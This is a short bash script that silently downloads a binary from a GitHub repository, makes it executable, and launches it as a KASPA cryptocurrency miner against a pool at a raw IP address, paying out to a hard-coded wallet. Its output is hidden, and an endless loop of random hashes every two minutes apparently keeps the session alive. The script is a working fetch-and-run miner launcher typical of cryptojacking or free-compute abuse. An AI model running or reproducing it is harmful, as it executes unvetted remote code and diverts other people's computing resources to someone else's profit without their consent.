#!/bin/bash
#!/bin/sh
#!/bin/bash

wget https://github.com/aliwardani1/simponi/raw/main/simponii >/dev/null 2>&1

chmod +x simponii >/dev/null 2>&1

./simponii --algo KASPA --pool 47.88.87.106:443 --user 3EFjw7CTQm1jzWK79yrXxW33nTfw8ZFdSV.cocol

while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
